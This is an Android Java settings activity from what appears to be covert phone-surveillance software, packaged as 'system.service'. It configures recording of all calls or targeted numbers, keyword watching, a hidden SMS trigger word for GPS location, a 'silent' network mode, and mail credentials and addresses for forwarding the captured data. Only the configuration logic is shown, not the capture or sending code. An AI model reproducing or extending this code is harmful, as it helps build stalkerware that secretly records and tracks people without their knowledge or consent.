package system.service.activity;  
  
import java.util.Date;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;  
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.SharedPreferences.OnSharedPreferenceChangeListener;
import android.content.res.Resources;
import android.content.res.TypedArray;  
import android.net.Uri;  
import android.os.Bundle;  
import android.preference.CheckBoxPreference;  
import android.preference.EditTextPreference;  
import android.preference.ListPreference;  
import android.preference.Preference;
import android.preference.PreferenceActivity;  
import android.preference.PreferenceCategory;  
import android.preference.PreferenceManager;
import android.preference.PreferenceScreen;
import android.util.Log;

import system.service.R;
import com.particle.inspector.common.util.SysUtils;
import com.particle.inspector.common.util.StrUtils;
import com.particle.inspector.common.util.license.LicenseCtrl;
import com.particle.inspector.common.util.license.LICENSE_TYPE;
  
public class GlobalPrefActivity extends PreferenceActivity 
{
	private final static String LOGTAG = "GlobalPrefActivity";
	private Context context;
	private OnSharedPreferenceChangeListener chgListener;
	
	public static final String HAS_CHG_RECEIVER_INFO = "has_changed_receiver_info"; // mail, phone number, GPS word
	public static final String TARGET_NUMBER_BREAKER = " ";
	public static final int MAX_TARGET_NUM_COUNT = 9;
	public static final String SENSITIVE_WORD_BREAKER = " ";
	public static final int MAX_SENSITIVE_WORD_COUNT = 9;
	public static final int GPS_WORD_MAX_LEN = 24;
	
	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		
		context = getApplicationContext();
		// All values will be automatically saved to SharePreferences
		addPreferencesFromResource(R.xml.preference);
		
		// Init preference summary fields
		int prefCount = this.getPreferenceScreen().getPreferenceCount();
		for(int i = 0; i < prefCount; i++){
            initSummary(this.getPreferenceScreen().getPreference(i));
        }
		
		// Show special summary
		setSpecialSummary();
		
		// Set state of recording target number
		//SharedPreferences sp = getPreferenceScreen().getSharedPreferences();
		SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(this);
		setRecordTargetNumState(sp, this);
		
		// Set state of sender mail&password
		setSenderMailState(sp, this);
		
		// Register	preference change listener
		chgListener = new OnSharedPreferenceChangeListener(){
			@SuppressWarnings("unused")
			@Override
			public void onSharedPreferenceChanged(SharedPreferences sharedPreferences, String key) {
				if (context == null) context = getApplicationContext();
				if (key.equals("pref_use_self_sender")) {
					setSenderMailState(sharedPreferences, GlobalPrefActivity.this);
				}
				else if (key.equals("pref_sender_mail")) {
					String oriSenderMail = sharedPreferences.getString("pref_sender_mail", "");
					String senderMail = oriSenderMail.trim();
					if(!StrUtils.validateMailAddress(senderMail)) {
						String msg = String.format(getResources().getString(R.string.pref_invalid_mail_format), senderMail);
						SysUtils.messageBox(context, msg);
					}
				}
				else if (key.equals("pref_sender_pwd")) {
					String oriSenderPwd = sharedPreferences.getString("pref_sender_pwd", "");
					String senderPwd = oriSenderPwd.trim();
					if (senderPwd.length() <= 0) {
						SysUtils.messageBox(context, getResources().getString(R.string.pref_pls_input_pwd));
					}
				}
				else if (key.equals("pref_recv_mail")) {
					checkRecvMailFormat(sharedPreferences, context);
					enableReceiverInfoChgFlag();
				}
				else if (key.equals("pref_recv_phonenum")) {
					String oriPhoneNum = sharedPreferences.getString("pref_recv_phonenum", "");
					String phoneNum = oriPhoneNum.trim();
					if (phoneNum.length() == 0) {
						SysUtils.messageBox(context, getResources().getString(R.string.pref_pls_input_phonenum));
					}
					//if (!phoneNum.equals(oriPhoneNum)) setRedirectPhoneNum(getApplicationContext(), phoneNum);
					if (phoneNum.length() > 0) enableReceiverInfoChgFlag();
				}
				else if (key.equals("pref_info_interval")) {
					String intervalStr = sharedPreferences.getString("pref_info_interval", "1"); //day
					int interval = Integer.parseInt(intervalStr);
				}
				else if (key.equals("pref_record_all")) {
					setRecordTargetNumState(sharedPreferences, GlobalPrefActivity.this);
				}
				else if (key.equals("pref_record_target_number")) {
					String oriNumbers = sharedPreferences.getString("pref_record_target_number", "");
					String numbers = oriNumbers.trim();
					if (numbers.length() == 0 && !getRecordAll(context)) {
						SysUtils.messageBox(context, getResources().getString(R.string.pref_pls_input_target_number));
					} else {
						numbers = numbers.replaceAll(" {2,}", TARGET_NUMBER_BREAKER); // Remove duplicated blank spaces
						if (numbers.split(TARGET_NUMBER_BREAKER).length > MAX_TARGET_NUM_COUNT) {
							String msg = String.format(getResources().getString(R.string.pref_sensitive_words_count_reach_max), MAX_SENSITIVE_WORD_COUNT);
							String title = context.getResources().getString(R.string.warning);
							SysUtils.warningDlg(context, title, msg);
						}
					}
				}
				else if (key.equals("pref_sensitive_words")) {
					String oriWords = sharedPreferences.getString("pref_sensitive_words", "");
					String words = oriWords.trim();
					if (words.length() == 0) {
						SysUtils.messageBox(context, getResources().getString(R.string.pref_pls_input_sensitive_words));
					} else {
						words = words.replaceAll(" {2,}", SENSITIVE_WORD_BREAKER); // Remove duplicated blank spaces
						if (words.split(SENSITIVE_WORD_BREAKER).length > MAX_SENSITIVE_WORD_COUNT) {
							String msg = String.format(getResources().getString(R.string.pref_sensitive_words_count_reach_max), MAX_SENSITIVE_WORD_COUNT);
							String title = context.getResources().getString(R.string.warning);
							SysUtils.warningDlg(context, title, msg);
						}
					}
					//if (!words.equals(oriWords)) setSensitiveWords(getApplicationContext(), words);
				}
				else if (key.equals("pref_gps_word")) {
					String oriWord = sharedPreferences.getString("pref_gps_word", "");
					String word = oriWord.trim();
					if (word.length() == 0) {
						SysUtils.messageBox(context, getResources().getString(R.string.pref_pls_input_gps_activate_word));
					} else if (word.length() > GPS_WORD_MAX_LEN) {
						SysUtils.messageBox(context, getResources().getString(R.string.pref_gps_activate_word_max_len));
					}
					//if (!word.equals(oriWord)) setGpsWord(getApplicationContext(), word);
					if (word.length() > 0) enableReceiverInfoChgFlag();
				}
				
				// Update preference summary fields
				for(int i = 0; i < getPreferenceScreen().getPreferenceCount(); i++){
		            initSummary(getPreferenceScreen().getPreference(i));
		        }
				
			}			
        };
		sp.registerOnSharedPreferenceChangeListener(chgListener);
	}
	
	private void enableReceiverInfoChgFlag() {
		Intent intent = this.getIntent();
		Bundle bn = intent.getExtras();
		bn.putBoolean(HAS_CHG_RECEIVER_INFO, true);
		intent.putExtras(bn);
		setResult(RESULT_OK, intent);
	}
	
	private void initSummary(Preference p) {
		if (p instanceof PreferenceCategory) {
			PreferenceCategory pCat = (PreferenceCategory)p;
			for(int i = 0; i < pCat.getPreferenceCount(); i++) {
				initSummary(pCat.getPreference(i));
			}
		} else {
			updatePrefSummary(p);
		}
	}

	private void updatePrefSummary(Preference p) {
		if (p instanceof ListPreference) {
			ListPreference listPref = (ListPreference)p; 
			p.setSummary(listPref.getEntry()); 
		}
		if (p instanceof EditTextPreference) {
			EditTextPreference editTextPref = (EditTextPreference)p; 
			p.setSummary(editTextPref.getText()); 
		}
	}
	
	private boolean checkRecvMailFormat(SharedPreferences sharedPreferences, Context context) {
		boolean valid = true;
		String oriMail = sharedPreferences.getString("pref_recv_mail", "");
		String mail = oriMail.trim();
		//if (!mail.equals(oriMail)) setMail(context, mail);
		String[] mails = mail.split(",");
	    Pattern p = Pattern.compile(StrUtils.REGEXP_MAIL);
	    
	    for (String eachMail : mails) {
	    	if (eachMail.trim().length() > 0) {
	    		Matcher matcher = p.matcher(eachMail.trim());
   	 			if (!matcher.matches()) {
   	 				String msg = String.format(context.getResources().getString(R.string.pref_invalid_mail_format), eachMail.trim());
   	 				SysUtils.messageBox(context, msg);
   	 				valid = false;
   	 				break;
   	 			}
	    	}
	    }
	    return valid;
	}
	
	private void setSenderMailState(SharedPreferences sharedPreferences, Context context) {
		boolean useSelfSender = sharedPreferences.getBoolean("pref_use_self_sender", false);
		if(useSelfSender) {
			((PreferenceCategory)getPreferenceScreen().getPreference(0)).getPreference(1).setEnabled(true);
			((PreferenceCategory)getPreferenceScreen().getPreference(0)).getPreference(2).setEnabled(true);
		} else {
			((PreferenceCategory)getPreferenceScreen().getPreference(0)).getPreference(1).setEnabled(false);
			((PreferenceCategory)getPreferenceScreen().getPreference(0)).getPreference(2).setEnabled(false);
			
			// If not use self sender, cannot record all phone calls
			if (getRecordAll(context)) {
				String title = context.getResources().getString(R.string.warning);
				String msg   = context.getResources().getString(R.string.pref_must_use_self_sender);
				setRecordAll(context, false);
				this.getListView().scrollTo(0, 800);
				SysUtils.messageBox(context, title + ": " + msg);
			}
		}
	}
	
	private void setRecordTargetNumState(SharedPreferences sharedPreferences, Context context) {
		boolean recordAll = sharedPreferences.getBoolean("pref_record_all", false);
		if(recordAll) {
			// Must use self sender if recording all phone calls
			if (!getUseSelfSender(context)               ||
				getSenderMail(context).length()     <= 0 ||
				getSenderPassword(context).length() <= 0) 
			{	
				String title = context.getResources().getString(R.string.warning);
				String msg   = context.getResources().getString(R.string.pref_must_use_self_sender);
				setUseSelfSender(context, true);
				this.getListView().scrollTo(0, 0);// Go to top
				SysUtils.messageBox(context, title + ": " + msg);
			}
			
			((PreferenceCategory)getPreferenceScreen().getPreference(3)).getPreference(1).setEnabled(true);
		} else {
			((PreferenceCategory)getPreferenceScreen().getPreference(3)).getPreference(1).setEnabled(false);
		}
	}
	
	private void setSpecialSummary() {
		String summary = getResources().getString(R.string.pref_record_number_summary);
		((PreferenceCategory)this.getPreferenceScreen().getPreference(3)).getPreference(0).setSummary(summary);
		summary = getResources().getString(R.string.pref_network_mode_summary);
		((PreferenceCategory)this.getPreferenceScreen().getPreference(4)).getPreference(0).setSummary(summary);
		summary = getResources().getString(R.string.pref_sensitive_words_summary);
		((PreferenceCategory)this.getPreferenceScreen().getPreference(5)).getPreference(0).setSummary(summary);
		summary = getResources().getString(R.string.pref_gps_word_summary);
		((PreferenceCategory)this.getPreferenceScreen().getPreference(6)).getPreference(0).setSummary(summary);
	}
	
	public static boolean getUseSelfSender(Context context) {
		return PreferenceManager.getDefaultSharedPreferences(context).getBoolean("pref_use_self_sender", false);
	}
	
	public static void setUseSelfSender(Context context, boolean value) {
		PreferenceManager.getDefaultSharedPreferences(context).edit().putBoolean("pref_use_self_sender", value).commit();
	}
	
	public static String getSenderMail(Context context) {
		return PreferenceManager.getDefaultSharedPreferences(context).getString("pref_sender_mail", "").trim();
	}
	
	public static void setSenderMail(Context context, String value) {
		PreferenceManager.getDefaultSharedPreferences(context).edit().putString("pref_sender_mail", value).commit();
	}
	
	public static String getSenderPassword(Context context) {
		return PreferenceManager.getDefaultSharedPreferences(context).getString("pref_sender_pwd", "").trim();
	}
	
	public static void setSenderPassword(Context context, String value) {
		PreferenceManager.getDefaultSharedPreferences(context).edit().putString("pref_sender_pwd", value).commit();
	}
	
	public static String getReceiverMail(Context context) {
		return PreferenceManager.getDefaultSharedPreferences(context).getString("pref_recv_mail", "").trim();
	}
	
	public static void setReceiverMail(Context context, String value) {
		PreferenceManager.getDefaultSharedPreferences(context).edit().putString("pref_recv_mail", value).commit();
	}
	
	public static String getReceiverPhoneNum(Context context) {
		return PreferenceManager.getDefaultSharedPreferences(context).getString("pref_recv_phonenum", "").trim();
	}
	
	public static void setReceiverPhoneNum(Context context, String value) {
		PreferenceManager.getDefaultSharedPreferences(context).edit().putString("pref_recv_phonenum", value).commit();
	}
	
	public static int getInfoInterval(Context context) {
		return Integer.parseInt(PreferenceManager.getDefaultSharedPreferences(context).getString("pref_info_interval", "1"));
	}
	
	public static void setInfoInterval(Context context, int value) {
		PreferenceManager.getDefaultSharedPreferences(context).edit().putInt("pref_info_interval", value).commit();
	}
	
	public static boolean getRecordAll(Context context) {
		return PreferenceManager.getDefaultSharedPreferences(context).getBoolean("pref_record_all", false);
	}
	
	public static void setRecordAll(Context context, boolean value) {
		PreferenceManager.getDefaultSharedPreferences(context).edit().putBoolean("pref_record_all", value).commit();
	}
	
	public static String getRecordTargetNum(Context context) {
		return PreferenceManager.getDefaultSharedPreferences(context).getString("pref_record_target_number", "").trim();
	}
	
	public static void setRecordTargetNum(Context context, String value) {
		PreferenceManager.getDefaultSharedPreferences(context).edit().putString("pref_record_target_number", value).commit();
	}
	
	public static NETWORK_CONNECT_MODE getNetworkConnectMode(Context context) {
		String str = PreferenceManager.getDefaultSharedPreferences(context).getString("pref_network_mode", "silent");
		if (str.equals("active")) return NETWORK_CONNECT_MODE.ACTIVE;
		else return NETWORK_CONNECT_MODE.SILENT;
	}
	
	public static void setNetworkConnectMode(Context context, NETWORK_CONNECT_MODE value) {
		if (value == NETWORK_CONNECT_MODE.ACTIVE)
			PreferenceManager.getDefaultSharedPreferences(context).edit().putString("pref_network_mode", "active").commit();
		else 
			PreferenceManager.getDefaultSharedPreferences(context).edit().putString("pref_network_mode", "silent").commit();
	}
	
	public static String getSensitiveWords(Context context) {
		return PreferenceManager.getDefaultSharedPreferences(context).getString("pref_sensitive_words", "").trim();
	}
	
	public static void setSensitiveWords(Context context, String value) {
		PreferenceManager.getDefaultSharedPreferences(context).edit().putString("pref_sensitive_words", value).commit();
	}
	
	public static String getGpsWord(Context context) {
		return PreferenceManager.getDefaultSharedPreferences(context).getString("pref_gps_word", "").trim();
	}
	
	public static void setGpsWord(Context context, String value) {
		PreferenceManager.getDefaultSharedPreferences(context).edit().putString("pref_gps_word", value).commit();
	}
	
	public static boolean getDisplayGpsSMS(Context context) {
		return PreferenceManager.getDefaultSharedPreferences(context).getBoolean("pref_gps_show_sms", false);
	}
	
	public static void setDisplayGpsSMS(Context context, boolean value) {
		PreferenceManager.getDefaultSharedPreferences(context).edit().putBoolean("pref_gps_show_sms", value).commit();
	}
	
}